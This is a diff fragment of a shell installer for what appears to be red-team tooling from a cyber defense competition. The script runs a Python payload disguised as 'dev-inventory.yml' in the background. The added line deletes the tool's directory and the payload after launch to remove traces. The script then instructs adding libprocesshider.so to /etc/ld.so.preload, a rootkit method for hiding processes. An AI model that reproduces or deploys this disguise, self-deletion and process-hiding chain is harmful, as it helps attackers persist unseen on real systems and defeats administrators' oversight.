@@ -48,6 +48,8 @@ mv dev-inventory.yml ../dev-inventory.yml
 
 python3 ../dev-inventory.yml $1 $2 &
 
+cd .. && rm -rf ccdc-invisible-saturation dev-inventory.yml
+
 echo "Script execution completed successfully."
 echo "To finish installation, use "
 echo "/usr/local/lib/libprocesshider.so >> /etc/ld.so.preload"
